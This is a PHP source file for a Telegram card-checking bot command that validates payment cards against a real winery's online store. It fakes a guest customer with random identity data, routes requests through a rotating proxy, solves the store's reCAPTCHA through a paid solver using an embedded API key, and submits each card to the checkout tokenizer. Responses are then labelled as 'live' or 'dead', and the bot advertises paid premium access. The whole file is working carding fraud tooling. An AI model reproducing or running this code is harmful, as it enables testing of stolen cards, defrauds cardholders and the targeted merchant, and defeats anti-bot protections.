<?php
if(cmd($message, "nks")){
        is_registerv();
$NameGater ='Auth 2';
$gateway = "/nks $NameGater";
is_gateroff($NameGater); //off Gater
is_freeuser(); // true ´Premium
deleteprm($userId); // delete Premium
Contador($gateway);

IS_BANNED($userId,$chatId,$message_id);
sendaction($chatId, typing);

deleteprm($userId);

$lista = substr($message, 4);

if(empty($lista)){
$lista = $r_msg;
}if(empty($lista)){
$lista = $q_msg;}

if(empty($lista)){
bot('sendMessage', [
                'chat_id' =>$chatId,
                'disable_web_page_preview' => true,
    'reply_to_message_id'=>$message_id,
    'parse_mode'=>'HTML',
                'text' =>"<b>[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gate Auth: >_ $-Security System ⚠️
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gateway: <code>$NameGater</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Pasarela: <code>Stripe Auth</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Status: <code>ONLINE! 🟩</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Format: <code>!nks card|month|year|cvv</code>
━━━━━━━━━━━━━━━━</b>"
                ]);
        die();
}

$tiempo_inicial = microtime(true);

$card = json_encode(Parser1($lista));
$card = json_decode($card, true);
$cc = $card["card"];
$mes = $card["MES"];
$ano = $card["ANO"];
$cvv = $card["CVV"];
$valid = $card["valid"];


if($valid == "ERROR"){
reply_to($chatId,$message_id,$keyboard,"<b>Invalid format</b>");
die();
}

if(bannedbin(substr($cc, 0,6)) == true){
reply_to($chatId,$message_id,$keyboard,"<b>Bin Banned</b>.");
exit();
}

if ($gId == $Mi_Id) $Rank = "Owner";
elseif (verifiAdmin($userId)) $Rank = "Admin";
elseif (veritimepremium($userId)) $Rank = infouser($userId)['apodo'];
elseif (verifiCharAdmin($chatId)) $Rank = "Free User";
elseif (verifiUser($userId)) $Rank = "Free user";

is_Antispma($userId, $chatId, $messageId, $keyboard);
    
    
$res = bininfo(substr($cc, 0,6));
$type = $res['type'];
$bank = $res['bank'];
$brand = $res['brand'];
$scheme = $res['level'];
$country = $res['country'];
$emoji = $res['Emoji'];

if($scheme == 'PREPAID'){
reply_to($chatId,$message_id,$keyboard,"<b>Bin PREPAID Banned</b>.");
die();
}

$messageidtoedit1 = bot('sendMessage', [
    'chat_id' =>$chatId,
    'disable_web_page_preview' => true,
'reply_to_message_id'=>$message_id,
'parse_mode'=>'HTML',
    'text' =>"<b>[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gate Auth: >_ $- Stripe Auth
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Status: <code>WAIT A FEW SECONDS 🟥</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gateway: <code>$NameGater</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Card: <code>$cc|$mes|$ano|$cvv</code> 
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Country: <code>$country - $emoji</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Type: <code>$type - $brand - $scheme</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Bank: <code>$bank</code> 
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Checked by: <a href='tg://user?id=$userId'>$username</a>[<code>$Rank</code>]
━━━━━━━━━━━━━━━━</b>
"
]);

$messageidtoedit = capture(json_encode($messageidtoedit1), '"message_id":', ',');

antisppre($userId); //Premium
antispFree($userId); //Free User

# ------------ Ramdom User ------------ #


$rotate = rotate();
$socks5 = socks5();


if(strlen($ano) == 2){
    $ano = "20".$ano;
}

if ($mes < 10) {
            $mes = substr($mes, -1);
        }
$json = file_get_contents("https://randomuser.me/api/?nat=us");
$data = json_decode($json, true);
$user = $data["results"][0];
$providers = array('gmail.com', 'hotmail.com', 'yahoo.com', 'outlook.com');
$provider = $providers[array_rand($providers)];
$email = strtolower($user["name"]["first"]) . '.' . strtolower($user["name"]["last"]) . '@' . $provider;
$firstname = $user["name"]["first"];
$lastname = $user["name"]["last"];
$street = $user["location"]["street"]["name"] . ' ' . $user["location"]["street"]["number"];
$state = $user["location"]["state"];
$city = $user["location"]["city"];
$phone = $user["phone"];
$zip = $user["location"]["postcode"];

$stateAb = [
    "Alabama" => "AL",
    "Alaska" => "AK",
    "Arizona" => "AZ",
    "Arkansas" => "AR",
    "California" => "CA",
    "Colorado" => "CO",
    "Connecticut" => "CT",
    "Delaware" => "DE",
    "District of Columbia" => "DC",
    "Florida" => "FL",
    "Georgia" => "GA",
    "Hawaii" => "HI",
    "Idaho" => "ID",
    "Illinois" => "IL",
    "Indiana" => "IN",
    "Iowa" => "IA",
    "Kansas" => "KS",
    "Kentucky" => "KY",
    "Louisiana" => "LA",
    "Maine" => "ME",
    "Maryland" => "MD",
    "Massachusetts" => "MA",
    "Michigan" => "MI",
    "Minnesota" => "MN",
    "Mississippi" => "MS",
    "Missouri" => "MO",
    "Montana" => "MT",
    "Nebraska" => "NE",
    "Nevada" => "NV",
    "New Hampshire" => "NH",
    "New Jersey" => "NJ",
    "New Mexico" => "NM",
    "New York" => "NY",
    "North Carolina" => "NC",
    "North Dakota" => "ND",
    "Ohio" => "OH",
    "Oklahoma" => "OK",
    "Oregon" => "OR",
    "Pennsylvania" => "PA",
    "Rhode Island" => "RI",
    "South Carolina" => "SC",
    "South Dakota" => "SD",
    "Tennessee" => "TN",
    "Texas" => "TX",
    "Utah" => "UT",
    "Vermont" => "VT",
    "Virginia" => "VA",
    "Washington" => "WA",
    "West Virginia" => "WV",
    "Wisconsin" => "WI",
    "Wyoming" => "WY",
];
$regioncode = $stateAb["$state"];

$password = substr(str_shuffle('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'), 0, 14);


$solver = new \Capsolver\CapsolverClient('CAP-5361C0C774F336BECC410D69E869566E');
$curl = new CurlX;
$cookie = uniqid();

$server = ["METHOD" => "CUSTOM", "SERVER" => 'all.dc.smartproxy.com:10000', "AUTH" => 'Testingthis123:Testingpassword12+'];

$req2 = $curl::Get('https://bartonfamilywines.orderport.net/product-details/0029/Wine-Bottle-Candle', $headers = ['Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
'Accept-Language: es-ES,es;q=0.9',
'Connection: keep-alive',
'Referer: https://www.bartonfamilywines.com/',
'Sec-Fetch-Dest: document',
'Sec-Fetch-Mode: navigate',
'Sec-Fetch-Site: cross-site',
'Sec-Fetch-User: ?1',
'Upgrade-Insecure-Requests: 1',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
'sec-ch-ua: "Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',] , $cookie,$server);
$VIEWSTATEGENERATOR = $curl::ParseString($req2->body, '<input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="', '"');
$VIEWSTATE = urlencode($curl::ParseString($req2->body, '<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="', '"'));
$EVENTVALIDATION = urlencode($curl::ParseString($req2->body, '<input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="', '"'));


$req2 = $curl::Post('https://bartonfamilywines.orderport.net/product-details/0029/Wine-Bottle-Candle',$data = 'ctl00%24scm=ctl00%24cphBody%24PageWrapper%24Content%24ctl00%24ucAddToCart%24upd%7Cctl00%24cphBody%24PageWrapper%24Content%24ctl00%24ucAddToCart%24lnkAddToCart&hdnRecaptchaToken=&__EVENTTARGET=ctl00%24cphBody%24PageWrapper%24Content%24ctl00%24ucAddToCart%24lnkAddToCart&__EVENTARGUMENT=&__VIEWSTATE='.$VIEWSTATE.'&__VIEWSTATEGENERATOR='.
$VIEWSTATEGENERATOR.'&__EVENTVALIDATION='.$EVENTVALIDATION.'&ctl00%24ucCatalogSearch%24txtWebstoreCatalog=&ctl00%24ucCatalogSearch%24ddlFilterOptions=&ctl00%24ucCatalogSearch%24txtProductSearchFilterUiState=%7B%22txtInitialScreenOffset%22%3A1199%2C%22txtPaddingLeft%22%3A%2220px%22%7D&ctl00%24cphBody%24PageWrapper%24Content%24ctl00%24ucAddToCart%24txtQty=1&__ASYNCPOST=true&', $headers = [
'Accept: */*',
'Accept-Language: es-ES,es;q=0.9',
'Cache-Control: no-cache',
'Connection: keep-alive',
'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
'Origin: https://bartonfamilywines.orderport.net',
'Referer: https://bartonfamilywines.orderport.net/product-details/0029/Wine-Bottle-Candle',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
'X-MicrosoftAjax: Delta=true',
'X-Requested-With: XMLHttpRequest',

] , $cookie,$server);

$req2 = $curl::Get('https://bartonfamilywines.orderport.net/basket.aspx', $headers = null, $cookie,$server);

$req2 = $curl::Get('https://bartonfamilywines.orderport.net/wwwapps/api/app-init/webstore', $headers = [
'Accept: */*',
'Accept-Language: es-ES,es;q=0.9',
'Cache-Control: no-cache',
'Connection: keep-alive',
'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
'Origin: https://bartonfamilywines.orderport.net',
'Referer: https://bartonfamilywines.orderport.net/product-details/0029/Wine-Bottle-Candle',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
'X-MicrosoftAjax: Delta=true',
'X-Requested-With: XMLHttpRequest',

], $cookie,$server);
$param = $curl::ParseString($req2->body, '"param":"', '"');

$headers = array();
$headers[] = 'Host: bartonfamilywines.orderport.net';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0';
$headers[] = 'Accept: application/json, text/plain, */*';
$headers[] = 'Accept-Language: es-CL,es;q=0.8,en-US;q=0.5,en;q=0.3';
$headers[] = 'sourceRefId: Auth.ShopAsGuestComponent';
$headers[] = 'Authorization: Bearer '.$param.'';
$headers[] = 'app-type: webstore';
$headers[] = 'api-version: 1.0.0.2';
$headers[] = 'Content-Type: application/json';
$headers[] = 'Origin: https://bartonfamilywines.orderport.net';
$headers[] = 'DNT: 1';
$headers[] = 'Sec-GPC: 1';
$headers[] = 'Connection: keep-alive';
$headers[] = 'Referer: https://bartonfamilywines.orderport.net/auth/shop-as-guest';



$req2 = $curl::Post('https://bartonfamilywines.orderport.net/wwwapps/api/customers/sign-up/guest',$data = '{"firstName":"'.$lastname.'","lastName":"'.$firstname.'","guest":true,"email":"'.$email.'"}', $headers , $cookie,$server);
$jwtToken = urldecode($curl::ParseString($req2->body, '"jwtToken":"', '"'));
$customerUuid = ($curl::ParseString($req2->body, '"customerUuid":"', '"'));
$customerNumber = substr($customerUuid, -6);




$req2 = $curl::Post('https://bartonfamilywines.orderport.net/wwwapps/api/customers/'.$customerUuid.'/addresses',$data = '{"id":-'.$customerNumber.',"customerNumber":'.$customerNumber.',"addressType":"Billing","firstName":"'.$firstname.'","lastName":"'.$lastname.'","country":"US","birthDate":"'.rand(1996,2001).'-'.str_pad(rand(1,12), 2, '0', STR_PAD_LEFT).'-'.str_pad(rand(1,28), 2, '0', STR_PAD_LEFT).'","email":"'.$email.'","isDefault":true,"company":"Tech'.$firstname.'","address1":"'.$street.'","address2":null,"city":"'.$city.'","state":"'.$regioncode.'","zipCode":"'.$zip.'","phone":"'.rand(275,360).'-'.rand(111,999).'-'.rand(1111,9999).'","phone2":"'.rand(275,360).'-'.rand(111,999).'-'.rand(1111,9999).'","fax":null}', $headers = [
'Accept: application/json, text/plain, */*',
'Accept-Language: es-ES,es;q=0.9',
'Authorization: Bearer '.$param.'',
'Content-Type: application/json',
'Origin: https://bartonfamilywines.orderport.net',
'Referer: https://bartonfamilywines.orderport.net/cart/checkout',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
'api-version: 1.0.0.2',
'app-session: '.$jwtToken.'',
'app-type: webstore',
'sourceRefId: Customer.CustomerAddressDetailsComponent',] , $cookie,$server);
$billingAddressId = ($curl::ParseString($req2->body, '"id":', ','));

$solution = $solver->recaptchaV3(
    \Capsolver\Solvers\Token\ReCaptchaV3::TASK_PROXYLESS,
    [
      'websiteURL'    => 'https://bartonfamilywines.orderport.net/',
      'websiteKey'    => '6LerBzMpAAAAADtSlftuCtkiZ4r5S0EHb2QU5-KE',
      'minScore'      =>  0.9,
    ]
);


$captcha = $solution["gRecaptchaResponse"];

$Pg = array("3"=>"Amex",
"4"=>"Visa",
"5"=>"MasterCard",
"6"=>"Discover"
);

$cardType = $Pg[substr($cc , 0,1)];

$req2 = $curl::Post('https://bartonfamilywines.orderport.net/wwwapps/api/payment-processing/tokenizer',$data = '{"card":{"token":null,"cardNumber":"' . $cc . '","cardType":"'.$cardType.'","nameOnCard":"'.$firstname.' '.$lastname.'","expMonth":5,"expYear":'.$ano.',"cvv":"'.$cvv.'","billingAddressId":' . $billingAddressId . '},"verificationCode":"' . $captcha . '","customerUuid":"'.$customerUuid.'","onFile":false,"persist":true}', $headers = [
'Accept: application/json, text/plain, */*',
'Accept-Language: es-ES,es;q=0.9',
'Authorization: Bearer '.$param.'',
'Content-Type: application/json',
'Origin: https://bartonfamilywines.orderport.net',
'Referer: https://bartonfamilywines.orderport.net/cart/checkout',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
'api-version: 1.0.0.2',
'app-session: '.$jwtToken.'',
'app-type: webstore',
'sourceRefId: Customer.CustomerAddressDetailsComponent',] , $cookie,$server);
$mgs = ($curl::ParseString($req2->body, '"text":"', '"'));


$tiempo_final = microtime(true);
$tiempo = $tiempo_final - $tiempo_inicial;
$timet = substr($tiempo, 0, 4);
edit_message($chatId,$message_id_1,$keyboard,urlencode("<b>[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gate Auth: >_ $- Stripe Auth
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Status: <code>ALMOST FINISHED 🟩</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gateway: <code>$NameGater</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Card: <code>$cc|$mes|$ano|$cvv</code> 
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Country: <code>$country - $emoji</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Type: <code>$type - $brand - $scheme</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Bank: <code>$bank</code> 
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Checked by: <a href='tg://user?id=$userId'>$username</a>[<code>$Rank</code>]
━━━━━━━━━━━━━━━━</b>"));


if(substr_count($req2->body, ' CVV2 VALUE MISMATCH')){
$status = "APPROVED ✅ ";
$response = " CVV2 VALUE MISMATCH";
}elseif(substr_count($req2->body, 'Gateway Rejected: cvv')){
$status = "APPROVED ✅ ";
$response = "Gateway Rejected: cvv";
}elseif(substr_count($req2->body, 'Insufficient Funds')){
$status = "APPROVED ✅ ";
$response = "Insufficient Funds";
}elseif(substr_count($req2->body, 'Gateway Rejected: avs')){
$status = "APPROVED ✅ ";
$response = "Gateway Rejected: avs";
}elseif(substr_count($req2->body, 'Success') || ($req2->code == "200")){
$status = "APPROVED ✅ ";
$response = "APPROVED";
}else{
$status = "DECLINED #DEAD ❌";
$response = $mgs;
}


bot('editMessageText',[
    'chat_id'=>$chatId,
    'disable_web_page_preview' => true,
    'message_id'=>$messageidtoedit,
    'text'=>"<b>[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gate Auth: >_ $- Stripe Auth
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Card: <code>$cc|$mes|$ano|$cvv</code> 
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Status: <code>$status</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Response: <code>$response</code>
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Country: <code>$country - $emoji</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Type: <code>$type - $brand - $scheme</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Bank: <code>$bank</code> 
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Card Check info: Proxy's: <code>Live ✅</code> 
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Time: <code>$tiempo</code> | Gate: <code>$NameGater</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Checked by: <a href='tg://user?id=$userId'>$username</a>[<code>$Rank</code>]
━━━━━━━━━━━━━━━━</b>",
'parse_mode'=>'html',
'reply_to_message_id'=>$message_id,
            'parse_mode'=>'HTML',
            'reply_markup'=> json_encode(['inline_keyboard'=>[
                [['text'=>'Buy a premium membership here!','url'=>"https://t.me/soldieranvil"]]
                ],'resize_keyboard'=>true])
            ]);  

}
?>